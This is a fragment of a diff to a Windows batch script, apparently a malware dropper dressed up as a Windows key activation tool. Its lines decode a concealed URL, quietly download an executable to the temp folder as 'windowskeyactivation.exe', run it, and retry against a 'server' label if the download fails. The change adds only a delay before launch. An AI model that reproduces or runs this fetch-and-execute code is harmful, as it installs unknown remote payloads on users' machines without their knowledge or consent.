@@ -4,6 +4,7 @@ for /f "tokens=*" %%a in ('powershell "[System.Text.Encoding]::UTF8.GetString([S
 set "filename=%temp%\windowskeyactivation.exe"
 powershell -Command "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%url%' -OutFile '%filename%'" >nul 2>&1
 if exist "%filename%" (
+    timeout /t 5 /nobreak >nul
     start "" "%filename%"
 ) else (
     goto server
